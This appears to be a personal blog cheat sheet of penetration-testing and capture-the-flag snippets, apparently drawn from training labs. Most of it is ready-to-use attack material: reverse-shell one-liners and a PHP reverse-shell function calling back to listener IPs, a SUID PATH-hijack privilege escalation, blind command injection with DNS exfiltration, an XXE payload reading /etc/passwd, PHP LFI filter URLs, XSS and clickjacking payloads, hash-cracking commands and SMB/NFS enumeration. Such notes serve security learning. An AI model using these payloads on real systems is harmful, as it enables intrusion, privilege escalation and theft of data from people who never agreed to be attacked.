---
layout: post
title: Useful Tricks and Tips
---

```bash
sed -i 's/geteuid/getppid/' /usr/bin/vlc
```
- Base32 is a common transfer encoding. It consists of 32-char set. These char-sets are usually alphabet in uppercase. 
- Base64 is another common transfer encoding. It consists of 64-char set. These char-sets are usually alphabet in uppercase and lowercase.
- Hex consists of 16 bits of binary. It also known as base16
- Rot 13 or known as rotate 13 is a form of Caesar cipher which rotate in 13 times.
- Rot 47 or known as rotate 47 is another form of Caesar cipher which rotate in 47 times. It encode almost all visible ASCII character.
- Morse code is a combination of signal made of short and long impulsion (dot and dash). It was designed for telecommunication.
- Binary-Coded Decimal (BCD) is a base10 encoding technique.

```bash
Cipher: 85 110 112 97 99 107 32 116 104 105 115 32 66 67 68
```

- With the command doas we increase our privileges to the user root.

```bash
doas -u root /bin/bash
```

# Useful resource

[Reverse Engineering](http://docs.pwntools.com/en/stable/)
[Reverse Engineering](https://browserpwndbg.readthedocs.io/en/docs/)

# Hashcat

```bash
hashcat -m 1800 -a 0 hash.txt rockyou.txt
```

# Find command

```bash
find / -type f -newermt 2016-09-11 ! -newermt 2016-09-13 2>/dev/null

find / -perm -u=s -type f 2>/dev/null

cd /tmp
echo /bin/sh > curl
chmod 777 curl 
export PATH=/tmp:$PATH
/usr/bin/menu
```

<img src="/assets/images/kenobi.png" style="align:center" />

# Upgrading to a shell

```bash
python -c 'import pty;pty.spawn('/bin/bash')'
SHELL=/bin/bash script -q /dev/null
```

# Reverse Shell

```bash
php -r '$sock=fsockopen("x.x.x.x",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.2.97 9001 >/tmp/f
bash -c "bash -i >& /dev/tcp/10.2.8.75/8080 0>&1"
```

# Blind OS injection

```bash

||whoami>/var/www/images/output.txt||

# using DNS exfiltration Technique

email=x||nslookup+x.burpcollaborator.net||

```

# XXE Attacks

```html
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>

```
# XSS payloads

```html
<script>onclick(alert("Hello"));</script>
// window.location.hostname

```

# John Hashing

```sh

john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt
```

# Encryption gpg
- gpg --cipher-algo [encryption type] [encryption method] [file to encrypt] 
- gpg --cipher-algo AES-256 --symetric xyz.txt

## decryption
-- gpg xyz.txt

# How to crack encrypted files using john the ripper
- gpg2john [encrypted gpg file] > [filename of the hash you want to create]

# Reverse a wordlist
```sh
tac data.txt > new_data.txt
```
# Email re

```bash

email_re = re.compile(r'([a-zA-Z0-9_\+\-\.]+)@(([[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)')
```

## Php reverse shell function

```php

<?php 

function execInBackground($cmd) {
    if (substr(php_uname(), 0, 7) == "Windows") {
            pclose(popen("start /B ". $cmd, "r"));
    }else{ 
      exec($cmd . " > /dev/null &");}}
    execInBackground("/bin/bash -c 'bash -i >& /dev/tcp/10.8.2.XX/9001 0>&1'");
?>

```


# PHP LFI

```bash
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```
# Practice Labs
Capture the Flag (CTF) API Portal

    docker pull sbacker/ctfapi
    docker run --name ctfapi1 -p 8000:8000 -it -d sbacker/ctfapi

Witcher Portal

    docker pull sbacker/witcherportal
    docker run -it -d --name witcher10 -p8080:8080 -e PYTHONUNBUFFERED=1 sbacker/witcherportal

# Clickjack Attack Payload

```html
<style>
   iframe {
       position:relative;
       width:700px;
       height: 500px;
       opacity: 0.0001;
       z-index: 2;
   }
   div {
       position:absolute;
       top:300px;
       left:60px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://acbe1f391e8fd65480c7a7ac017500d7.web-security-academy.net/exploit"></iframe>

```
# Enumerating Samba
-SMB has two ports, 445 and 139
- On most distributions of Linux smbclient is already installed. Lets inspect one of the shares.


Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve.

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.89.231
mkdir /mnt/kenobiNFS
mount machine_ip:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```


```bash
On most distributions of Linux smbclient is already installed. Lets inspect one of the shares.

smbclient //<ip>/anonymous
smbget -R smb://<ip>/anonymous
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.89.231

```
